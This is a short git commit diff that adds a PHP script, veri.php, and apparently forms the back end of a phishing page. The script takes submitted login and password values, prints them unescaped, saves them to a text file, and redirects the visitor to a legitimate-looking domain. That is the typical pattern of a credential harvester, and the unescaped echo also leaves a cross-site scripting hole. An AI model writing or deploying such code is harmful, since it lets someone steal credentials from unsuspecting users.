16945a77efed437c3f9c8d205aaeb51d697daabe
ankamt2 <112321774+ankamt2@users.noreply.github.com>
2023-05-26 20:30:57 +0300

    Update and rename veri.html to veri.php

---
+++ veri.php
@@ -0,0 +1,12 @@
+<?php
+    echo "Kullanıcı Adı: ".$_POST["login"]."<br>";
+    echo "Şifre: ".$_POST["password"];
+
+    $dosya=fopen("Veriler.txt","w+");  
+    fwrite($dosya, "Kullanıcı Adı: ".$_POST["login"]);
+    fwrite($dosya, "Şifre: ".$_POST["password"]);
+
+
+
+    header("Location: https://www.anka2.com.tr");
+
